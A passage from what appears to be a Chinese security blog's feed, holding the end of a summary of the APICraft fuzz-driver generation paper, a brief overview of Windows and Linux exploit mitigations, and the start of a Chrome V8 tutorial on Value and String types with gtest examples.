datadependency关系并不会被trace到（GUI应⽤程序没有相应的API调⽤组合）。APICraft还会做dependency推测（inference）这⼀步。APICraft定义了三个推测规则：</p><ol type="1"><li><p><strong>R1: Dependency-basedtransition</strong>：如果函数A的output与函数C的输⼊参数相匹配，并且函数B的output与函数C的输⼊参数相匹配，以及又trace到，函数A的output与函数D的输⼊参数相匹配，APICraft会推断出，函数B的output跟函数D的输⼊参数能够相匹配并产生⼀组datadependency关系；</p></li><li><p><strong>R2: Type-basedtransition</strong>：当APICraft观察到函数A的output的类型信息与函数B的输⼊参数类型信息⼀致，这个时候APICraft会做个推测，因为这⾥没有值（value）信息，所以是个推测，推测出函数A的output是函数B的输⼊参数；</p></li><li><p><strong>R3: Inter-thread data flowdependency</strong>：R3与图6的算法是⼀致的，只不过在这个规则下，会限定类型是指针，⼀般跨线程之间会传递指针，需要减少误报。</p></li></ol><h3 id="control-dependency"><strong>3.1.2 ControlDependency</strong></h3><p>APICraft收集到的Control Dependency主要是⽤来解决error codechecking的：</p><ol type="1"><li><p>API函数的输出参数（output parameter）或者返回值（returnvalue）是指针类型，将对这个output值 进⾏⾮空判断（nullcheck）；</p></li><li><p>API函数的输出参数（output parameter）或者返回值（returnvalue）是整数类型，并且是个statuscode的话，将进行动态污点分析来获取error codechecking分⽀的表达式。（1）获取这个API函数的调用处（callsite）；（2）通过静态分析找到⼀些errorcode checking的系统调用，比如exit，abort 等。这些basicblock会被标记为checkpoint。（3）最后从调用处（callsite）开始进行taintanalysis，因为正常的GUI应用程序会走正常分⽀，当走到checkpoint相应分⽀的时候将表达式取反，让污点分析传播到checkpoint处。拿到对应的表达式。</p></li></ol><h2 id="dependency-combination"><strong>3.2 DependencyCombination</strong></h2><p>APICraft将收集并解析完成的data dependency以及controldenpendency进行Combination，再通过多目标优化遗传算法进行变异演化。</p><h3 id="问题建模"><strong>3.2.1 问题建模</strong></h3><p>APICraft将fuzzdriver⽣成问题抽象成⼀个数学问题，利用多目标优化遗传算法（Multi-ObjectiveGenetic Algorithm）进行求解。</p><p>具体而言，以GUI应用程序（调用相应 SDK提供的API）的API函数使用方式为初始种群，对这些种群进⾏变异演化生成fuzzdriver，通过判断生成的fuzz driver的优劣，将优越fuzzdriver保留下来继续变异，最后生成满足要求的fuzz driver用于fuzzing。我们认为<strong>⼀个高质量的fuzzdriver需要满足三个⽬标</strong>：</p><ol type="1"><li><p><strong>多样性（Diversity）</strong>：多样性（Diversity）指的是fuzzdriver能够调⽤⾜够多样的API使fuzzdriver程序行为更丰富。即为了让生成出来的fuzz driver有更多不同的datadependencies，如果datadependencies能够组成loop，每条loop都会给这个目标加分数。图7所示的多样性（Diversity）的公式是生成的fuzzdriver的有向多边图的边（即单个datadependency）的数量，加上这个图的圈复杂度。总体是要表征datadependency图（或者说fuzz driver的API调⽤）的多样性。 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/7.png"alt="图 7：Diversity公式" /></p></li><li><p><strong>有效性（Effectiveness）</strong>：有效性（Effectiveness）是这三个指标中的唯⼀⼀个需要动态反馈信息的指标，其目标是要让⽣成的fuzzdriver的API调用更合法有效。我们会给basicblocks中有调用其他函数的，以及这个basicblock处于loop循环中的更多分数，因为我们觉得相对于核心代码而言errorhandling code在⼀个API函数中会执行更少的basicblocks，而核⼼代码会有更多的loop信息或者其他函数调用。该指标是个动态的feedback，是需要将fuzzdriver序列化成代码编译运行后得来的，我们对每个basicblock评分：（1）调⽤其余函数以及处于loop循环中，评分3分；（2）调⽤其余函数或者处于loop循环中，2分；（3）两者均⽆则1分。</p></li><li><p><strong>紧凑性（Compactness）</strong>：coredependency指的是从接收inputfile的API函数为起点，以此为根结点的展开的data dependency图。non-coredependency就是与这颗树无关的data dependency。F是core function（处于 coredependency中的函数）集合，f是集合⾥⾯的每个函数，If是每个函数的参数集合。k是每个input参数的无关函数数量，5是个经验值（即如果无关函数数量超过5，则该紧凑性（Compactness）指标得分为0）。</p></li></ol><p>紧凑性（Compactness）指标⽬的是为了让fuzzdriver去除冗余API调⽤，冗余API调用就是跟以接收input file API为起点的datadependency 图无关的API调用，即存在于non-coredependency图中的API调用。所以在core dependency的datadependency分数会高，non-core dependency中的datadependency分数会低。图8是Compactness的具体公式。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/8.png"alt="图 8：Compactness公式" /><figcaption aria-hidden="true">图 8：Compactness公式</figcaption></figure><h3 id="多标优化遗传算法multi-objective-genetic-algorithm"><strong>3.2.2多⽬标优化遗传算法（Multi-Objective Genetic Algorithm）</strong></h3><p>APICraft采用了NSGA-II算法来对Diversity、Effectiveness、Compactness这三个目标进行多目标优化的遗传算法演进。</p><p>图9是整体的APICraft的多目标优化遗传算法，输入datadependency集合，输出是⼀系列的fuzz driver集合：</p><ol type="1"><li><p>25-31行即传统的遗传算法，先生成初始的种子集，选取初始种子集，然后开始变异，再选择存活下来的个体，继续变异，往复。直到到了我们限定的变异轮数。28行进行变异，29行选取最优个体；</p></li><li><p>17-23行选取两个种⼦进⾏交叉变异；</p></li><li><p>11-16行对交叉变异后的种⼦进行多目标优化的评分计算，然后筛出最优个体。12行计算目标评分，13行进行非支配排序算法，进行分层。14行计算拥挤度与拥挤度比较算子。15行筛选出来最优个体；</p></li><li><p>1-10行就是对个体先进行序列化后，计算三个目标的分值。</p></li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/9.png"alt="图 9：APICraft的多⽬标优化遗传算法" /><figcaption aria-hidden="true">图9：APICraft的多⽬标优化遗传算法</figcaption></figure><h1 id="实现"><strong>04 实现</strong></h1><p>APICraft⼯程实现中核⼼之⼀是动态trace功能，动态trace是为了获取API函数的参数以及返回值。如图10所示，在hook中有两种机制：</p><ol type="1"><li><p>Type-I需要两个hook点，函数的enter point以及exit point，enterpoint容易分析，但函数的exitpoint⽆法准确判断，因为⼀个函数可能会有多个exit点，单纯通过判断ret指令是无法精确判断exit点的，特别是当⼆进制程序被高度编译优化过。错误的exit点的hook机制会导致后续收集的nestedlevel等信息都有误；</p></li><li><p>Type-II则没有这个问题，基于interposition的机制是中间有个媒介层在进⼊函数前接管，在退出函数之后也接管。我们就能准确拿到参数值以及返回值。Interposition机制的核心是会有⼀个跟被hook函数相同函数签名的替换函数，然后基于这个替换函数接管原函数的信息之后再调用原函数。在macOS上APICraft用DYLD_PRELOAD跟DYLD_INTERPOSE机制来实现，在Windows上我们用的是detour来实现。</p></li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/10.png"alt="图 10：两种 hook机制" /><figcaption aria-hidden="true">图 10：两种 hook机制</figcaption></figure><h1 id="实验结果"><strong>05 实验结果</strong></h1><h2 id="多目标优化遗传算法"><strong>5.1 多目标优化遗传算法</strong></h2><p>我们⼀共对5个攻击面进⾏了漏洞挖掘，包含了Image，Font，PDF，Audio，RTF，这里用Image这个攻击面来看看我们算法的实验效果，其他攻击面实验效果可查阅论文。</p><ol type="1"><li><p>图11左图是经过多目标遗传算法生成的fuzz driver跟人工写的fuzzdriver在fuzzing过程中覆盖率比对。紫⾊的线是APICraft生成的fuzzdriver，浅⾊线是Google Project Zero的安全研究员⼿写的fuzzdriver，这个fuzzdriver是研究员在对攻击面熟悉，并且通过逆向构建出来的fuzzdriver。实验来看， 通过APICraft产生的fuzzdriver在fuzzing过程中的覆盖率仍比P0顶尖安全研究员⼿写的fuzzdriver实验效果卓越；</p></li><li><p>图11右图是三个⽬标（Diversity、Effectiveness、Compactness）都结合起来生成的fuzzdriver跟去掉每⼀个单⼀目标而生成的fuzzdriver比对，比如绿色这条线是去掉多样性（Diversity）的覆盖率，去掉每个单⼀目标的实验效果没有三个目标都结合起来生成的fuzzdriver在fuzzing过程中的实验效果好。</p></li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/11.png"alt="图 11：图⽚攻击⾯的多⽬标优化遗传算法实验效果" /><figcaption aria-hidden="true">图11：图⽚攻击⾯的多⽬标优化遗传算法实验效果</figcaption></figure><h2 id="漏洞挖掘产出"><strong>5.2 漏洞挖掘产出</strong></h2><p>基于APICraft⽣成的fuzzdriver，我们进行了长达8个月的fuzzing。最终在macOS系统库5个攻击面上发现了<strong>142</strong>处漏洞，收到Apple<strong>54</strong>个官⽅漏洞致谢（该数据统计截⽌到论⽂投稿时，2021年2⽉）。</p><p>图12节选了⼀些漏洞，每⼀列分别是攻击面（AttackSurface），获取到的CVE号或者Issue-ID，macOS的复现版本，漏洞类型，已经能在哪些APP上⾯复现这些bug。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/APICraft/12.png"alt="图 12：漏洞挖掘产出" /><figcaption aria-hidden="true">图 12：漏洞挖掘产出</figcaption></figure><h1 id="总结"><strong>06 总结</strong></h1><p><strong>APICraft基于functioninterposition技术实现了轻量级的GUI应用程序动态行为收集框架，以及基于NSGA—II多目标优化遗传算法实现的fuzzdriver自动化生成框架</strong>。基于APICraft框架生成的fuzzdriver在fuzzing过程中帮助我们挖掘到了macOS系统库<strong>142</strong>处漏洞，共收获Apple<strong>54</strong>个官⽅漏洞致谢。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
      <tag>Program Analysis</tag>
      
      <tag>Fuzz Driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见漏洞缓解措施</title>
    <link href="/2021/11/26/Common-vulnerabilities-mitigation-measures/"/>
    <url>/2021/11/26/Common-vulnerabilities-mitigation-measures/</url>
    
    <content type="html"><![CDATA[<h1 id="windows">Windows</h1><h2 id="stack-cookie">Stack Cookie</h2><h2 id="dep数据执行保护">DEP（数据执行保护）</h2><p>Data Execution Prevention</p><h2 id="cfg控制流保护">CFG（控制流保护）</h2><p>每次间接调用前都对函数指针进行检查，在函数指针被修改到非法地址时终止程序。</p><h2 id="sehopsafeseh">SEHOP、SafeSEH</h2><p>SEHOP会检测SEH单链表的末尾是不是指向一个固定的SEH Handler。SafeSEH会检测当前使用的 SEH Handler是否指向当前模块的一个有效地址。</p><h2 id="heap-randomization-lfh随机化堆分配地址">Heap Randomization(LFH随机化堆分配地址)</h2><h1 id="linux">Linux</h1><h2 id="nx-dep-in-windows">NX （ DEP in Windows）</h2><p>NX通过现代操作系统的<strong>内存保护单元（Memory ProtectUint，MPU）</strong>机制对程序内存按页的粒度进行权限设置，其基本规则为可写与可执行权限互斥。</p><p>GCC默认开启，关闭在编译时加入<code>-z execstack</code></p><h2 id="stack-canary">Stack Canary</h2><p>GCC默认开启，关闭在编译是加入<code>-fno-stack-protector</code></p><h2 id="aslraddress-space-layout-randomization">ASLR（Address SpaceLayout Randomization）</h2><p>ASLR(Address space layoutrandomization，地址空间布局随机化)通过随机放置数据区域的地址空间来防止攻击者跳转到内存的特定位置。</p><p>在Linux系统中ASLR被分为0，1，2三个等级，可以通过<code>sudo bash -c "echo 2 &gt; /proc/sys/kernel/randomize_va_space"</code>设置。</p><blockquote><p>0）没有随机化。即关闭ASLR。</p><p>1）保留的随机化。共享库、栈、mmap()分配的内存空间以及VDSO将被随机化。</p><p>2）完全的随机化。在1的基础上，通过brk()分配的内存空间也将被随机化。</p></blockquote><h2 id="pie">PIE</h2><p>与ASLR相似，PIE保护的目的是让可执行程序ELF的地址进行随机化加载。</p><h2 id="full-relro">Full Relro</h2><p>RELRO(RELocationRead-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。</p><p>RELRO可以分为Partial RELRO(部分RELRO)和 Full RELRO(完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启 FULL RELRO的话GOT表是只读的。</p><p>Full RELRO 保护与Linux下的Lazy Binding机制有关。其主要作用是禁止.GOT.PLT表和其他一些相关内存的读写。</p><h2 id="smapsmep"><strong>SMAP/SMEP</strong></h2><p>SMAP(Supervisor Mode AccessPrevention，管理模式访问保护)和SMEP(Supervisor Mode ExecutionPrevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never) 和PAN(Privileged Access Never)。</p>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>System Security</tag>
      
      <tag>Memory Safety</tag>
      
      <tag>linux</tag>
      
      <tag>Vulnerability Mitigation</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome V8基础（三）</title>
    <link href="/2021/08/15/Basics-of-Chrome-V8-3/"/>
    <url>/2021/08/15/Basics-of-Chrome-V8-3/</url>
    
    <content type="html"><![CDATA[<h1 id="常用数据类型">常用数据类型</h1><p>对前面提到的一些数据类型加以说明</p><h2 id="基值value">基值（Value）</h2><p><code>v8::Value</code>是ChromeV8在JavaScript层面用到的各种数据（如<code>Number</code>、<code>String</code>、<code>Function</code>等）的一个总的基类，也就是说这些数据类型都是从<code>Value</code>继承而来的。所以我们经常能从代码中看到<code>Value</code>类型的本地句柄，也就是<code>Local&lt;Value&gt;</code>。关于ChromeV8的Value继承关系可以参阅<ahref="https://v8docs.nodesource.com/node-16.0/dc/d0a/classv8_1_1_value.html">文档</a>。</p><p>由于<code>Value</code>是很多JavaScript数据类型的父类，因此当遇到这种数据的句柄时，我们可以认为它是某一种数据类型的抽象。至于想要知道具体是哪一种数据类型，或者想要将其转换成特定的一种数据类型，就要依靠<code>Value</code>的各种API了。举个栗子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">V8_WARN_UNUSED_RESULT MaybeLocal&lt;Number&gt; <span class="hljs-title">ToNumber</span><span class="hljs-params">(Local&lt;Context&gt; context)</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function">V8_WARN_UNUSED_RESULT MaybeLocal&lt;String&gt; <span class="hljs-title">ToNumber</span><span class="hljs-params">(Local&lt;String&gt; context)</span> <span class="hljs-type">const</span></span>;<br>...<br></code></pre></td></tr></table></figure><h2 id="字符串string">字符串（String）</h2><p>V8中有许多不同的String类型，它们针对各种情况进行了优化，可以在<code>src/objects/objects.h</code>中看到层次结构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">    Object<br>SMI<br>HeapObject    <span class="hljs-comment">// superclass for every object instans allocated on the heap.</span><br>  ...<br>  Name<br>    String<br>      SeqString<br>        SeqOneByteString<br>        SeqTwoByteString<br>      SlicedString<br>      ConsString<br>      ThinString<br>      ExternalString<br>        ExternalOneByteString<br>        ExternalTwoByteString<br>      InternalizedString<br>        SeqInternalizedString<br>          SeqOneByteInternalizedString<br>          SeqTwoByteInternalizedString<br>        ConsInternalizedString<br>        ExternalInternalizedString<br>          ExternalOneByteInternalizedString<br>                ExternalTwoByteInternalizedString<br></code></pre></td></tr></table></figure><p>不过<code>v8::String</code>定义在<code>include/v8.h</code>中。可以看到String继承自Name</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetIdentityHash</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Name* <span class="hljs-title">Cast</span><span class="hljs-params">(Value* obj)</span></span><br></code></pre></td></tr></table></figure><h3 id="unicode">Unicode</h3><p>Unicode里的抽象字符（Abstractcharacters）有类似于<code>LATIN SMALL LETTER A</code>的名字，<code>Code point</code>是一个和抽象字符相关联的数字，比如<code>U+0061</code>，其中U表示Unicode。从U+n0000到U+nFFFF，65536个连续的codepoints叫做一个plane，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">Plane 0: U+0000 -&gt; U+FFFF           Basic Multilingual Plane (BMP)<br>Plane 1: U+10000 -&gt; U+1FFFF         Supplementary Multilingual Plane<br>Plane 2: U+20000 -&gt; U+2FFFF         Supplementary Ideographic Plane<br>Plane 3: U+30000 -&gt; U+3FFFF<br>...<br>Plane 16: U+100000 -&gt; U+10FFFF      Supplementary Private Use Area B.<br></code></pre></td></tr></table></figure><p>BPM包含编程时使用的绝大部分字符，用四个十六进制数字表示。</p><p>计算机中的内存不处理code points或者abstractcharacters，而是处理作为一个bit sequence的code uints。codepoints仅仅是一个查找抽象字符的数字而已，我们可以用一个函数将codepoint转换成codeunit，这个过程就叫做字符编码。计算机中存在着很多种编码，JavaScript使用的是UTF-16（16-bitUnicode Transformation Format）。</p><h3 id="string">String</h3><p>String就是一个拥有长度和内容的<code>Name</code>，内容由一个或两个字节组成，查看<code>include/v8.h</code>中的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Encoding</span> &#123;<br>  UNKNOWN_ENCODING = <span class="hljs-number">0x1</span>,<br>  TWO_BYTE_ENCODING = <span class="hljs-number">0x0</span>,<br>  ONE_BYTE_ENCODING = <span class="hljs-number">0x8</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-type">int</span> Uft8Length <span class="hljs-type">const</span>;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsOneByte</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libplatform/libplatform.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> v8;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StringTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, create) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; str = String::<span class="hljs-built_in">NewFromOneByte</span>(isolate_, <br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-string">&quot;bajja&quot;</span>),<br>      NewStringType::kNormal,<br>      <span class="hljs-number">6</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  <span class="hljs-function">String::Utf8Value <span class="hljs-title">value</span><span class="hljs-params">(isolate_, str)</span></span>;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(<span class="hljs-string">&quot;bajja&quot;</span>, *value);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Length</span>(), <span class="hljs-number">6</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Utf8Length</span>(isolate_), <span class="hljs-number">6</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsOneByte</span>(), <span class="hljs-literal">true</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsExternal</span>(), <span class="hljs-literal">false</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsExternalOneByte</span>(), <span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, NewFromUtf8) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; str = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, <span class="hljs-string">&quot;åäö&quot;</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Length</span>(), <span class="hljs-number">3</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Utf8Length</span>(isolate_), <span class="hljs-number">6</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsOneByte</span>(), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, fromStringLiteral) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; str = String::<span class="hljs-built_in">NewFromUtf8Literal</span>(isolate_, <span class="hljs-string">&quot;something&quot;</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Length</span>(), <span class="hljs-number">9</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Utf8Length</span>(isolate_), <span class="hljs-number">9</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsOneByte</span>(), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, empty) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; str = String::<span class="hljs-built_in">Empty</span>(isolate_); <br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Length</span>(), <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">Utf8Length</span>(isolate_), <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">IsOneByte</span>(), <span class="hljs-literal">true</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(str-&gt;<span class="hljs-built_in">ContainsOnlyOneByte</span>(), <span class="hljs-literal">true</span>);<br>  v8::<span class="hljs-function">String::Utf8Value <span class="hljs-title">empty</span><span class="hljs-params">(isolate_, str)</span></span>;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(*empty, <span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, concat) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; left = String::<span class="hljs-built_in">NewFromOneByte</span>(isolate_, <br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-string">&quot;hey&quot;</span>),<br>      NewStringType::kNormal,<br>      <span class="hljs-number">6</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;String&gt; right = String::<span class="hljs-built_in">NewFromOneByte</span>(isolate_, <br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-string">&quot; bajja&quot;</span>),<br>      NewStringType::kNormal,<br>      <span class="hljs-number">6</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;String&gt; joined = String::<span class="hljs-built_in">Concat</span>(isolate_, left, right);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(joined-&gt;<span class="hljs-built_in">Length</span>(), <span class="hljs-number">12</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(StringTest, compare) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;String&gt; first = String::<span class="hljs-built_in">NewFromOneByte</span>(isolate_,<br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-string">&quot;hey&quot;</span>),<br>      NewStringType::kNormal,<br>      <span class="hljs-number">6</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;String&gt; second = String::<span class="hljs-built_in">NewFromOneByte</span>(isolate_,<br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*&gt;(<span class="hljs-string">&quot;hey&quot;</span>),<br>      NewStringType::kNormal,<br>      <span class="hljs-number">6</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  v8::<span class="hljs-function">String::Utf8Value <span class="hljs-title">first_utf8</span><span class="hljs-params">(isolate_, first)</span></span>;<br>  v8::<span class="hljs-function">String::Utf8Value <span class="hljs-title">second_utf8</span><span class="hljs-params">(isolate_, second)</span></span>;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(*first_utf8, *second_utf8);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是v8.h中唯一的字符串类，但它有很多实现以用于多种用途。</p><h3 